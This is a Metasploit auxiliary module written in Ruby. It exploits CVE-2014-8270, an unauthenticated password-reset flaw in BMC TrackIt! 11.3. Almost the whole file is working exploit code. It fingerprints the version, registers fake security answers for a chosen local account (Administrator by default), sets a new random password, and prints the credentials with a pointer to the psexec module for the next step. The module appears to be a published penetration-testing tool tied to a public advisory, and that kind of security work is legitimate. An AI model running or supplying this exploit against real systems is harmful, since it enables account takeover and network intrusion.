##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary Local User Password Change',
      'Description'    => %q(
      This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3
      and possibly prior versions.
      ),
      'References'     =>
        [
          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-419/'],
          ['CVE', '2014-8270']
        ],
      'Author'         =>
        [
          'bperry', # discovery/metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 9 2014"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to BMC TrackIt!', '/']),
        OptString.new('LOCALUSER', [true, 'The local user to change password for', 'Administrator']),
        OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\'s computer name will be autodetected', ''])
      ], self.class)
  end

  def localuser
    datastore['LOCALUSER']
  end

  def password_reset
    begin
      uri = normalize_uri(target_uri.path, 'PasswordReset')
      send_request_cgi('uri' => uri)
    rescue => e
      vprint_error("#{peer}: unable to request #{uri}: #{e}")
      nil
    end
  end

  def check_host(ip)
    vprint_status("#{peer}: retrieving PasswordReset page to extract Track-It! version")

    unless (res = password_reset)
      return
    end

    if res.body =~ /<title>Track-It! Password Reset/i
      version = res.body.scan(/\bBuild=([\d\.]+)/).flatten.first
      if version
        fix_version = '11.4'
        if Gem::Version.new(version) < Gem::Version.new(fix_version)
          report_vuln(
            host: ip,
            port: rport,
            name: name,
            info: "Module #{fullname} detected Track-It! version #{version}",
            refs: references
          )
          vprint_status("#{peer}: Track-It! version #{version} is less than #{fix_version}")
          return Exploit::CheckCode::Vulnerable
        else
          vprint_status("#{peer}: Track-It! version #{version} is not less than #{fix_version}")
          return Exploit::CheckCode::Safe
        end
      else
        vprint_error("#{peer}: unable to get Track-It! version")
        return Exploit::CheckCode::Unknown
      end
    else
      vprint_status("#{peer}: does not appear to be running Track-It!")
      return Exploit::CheckCode::Safe
    end
  end

  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    if datastore['DOMAIN'].blank?
      vprint_status("#{peer}: retrieving session cookie and domain name")
    else
      vprint_status("#{peer}: retrieving domain name")
    end

    unless (res = password_reset)
      return
    end

    cookies = res.get_cookies
    if datastore['DOMAIN'].blank?
      if res.body =~ /"domainName":"([^"]*)"/
        domain = Regexp.last_match(1)
        vprint_status("#{peer}: found domain name: #{domain}")
      else
        print_error("#{peer}: unable to obtain domain name.  Try specifying DOMAIN")
        return
      end
    else
      domain = datastore['DOMAIN']
    end

    full_user = "#{domain}\\#{localuser}"
    vprint_status("#{peer}: sending password reset request for #{full_user}")
    answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'domainname' => domain,
        'userName' => localuser,
        'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
        'userQuestions' => %Q([{"Id":1,"Answer":"#{answers.first}"},{"Id":2,"Answer":"#{answers.last}"}]),
        'updatequesChk' => 'false',
        'SelectedQuestion' => 1,
        'SelectedQuestion' => 2,
        'answer' => answers.first,
        'answer' => answers.last,
        'confirmanswer' => answers.first,
        'confirmanswer' => answers.last
      }
    )

    if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
      print_error("#{peer}: Could not reset password for #{full_user}")
      return
    end

    password = Rex::Text.rand_text_alpha(10) + "!1"

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'newPassword' => password,
        'domain' => domain,
        'UserName' => localuser,
        'CkbResetpassword' => 'true'
      }
    )

    if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
      print_error("#{peer}: Could not change #{full_user}'s password -- is it a domain or local user?")
      return
    end

    report_vuln(
      host: ip,
      port: rport,
      name: name,
      info: "Module #{fullname} changed #{full_user}'s password to #{password}",
      refs: references
    )
    print_good("#{peer}: Please run the psexec module using #{full_user}:#{password}")
  end
end
